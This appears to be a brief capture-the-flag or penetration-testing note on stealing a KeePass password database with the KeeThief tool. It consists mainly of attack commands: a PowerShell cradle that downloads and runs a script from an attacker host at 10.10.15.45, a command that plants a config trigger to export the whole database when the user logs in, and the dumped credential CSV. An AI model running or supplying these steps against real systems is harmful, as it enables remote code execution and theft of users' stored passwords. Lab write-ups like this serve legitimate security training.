# KeePass KeeThief

### KeePass

* Used the KeeThief Config Trigger that will dump the entire database once the user logs in:
* pull down to box with&#x20;

```
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.45:8080/KeePassConfig.ps1')
```

* run with&#x20;

```
Add-KeePassConfigTrigger -Path $env:appdata\KeePass\KeePass.config.xml -Verbose -ExportPath C:\Windows\Tasks
```

```
KeePass
Used the KeeThief Config Trigger that will dump the entire database once the user logs in:
downloaded with: 
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.45:8080/KeePassConfig.ps1')
ran with:
Add-KeePassConfigTrigger -Path $env:appdata\KeePass\KeePass.config.xml -Verbose -ExportPath C:\Windows\Tasks

"Account","Login Name","Password","Web Site","Comments"
"Admin Account","ngodfrey_adm","PASSWORD","",""
"Flag","","FLAG{XXX}","",""
```
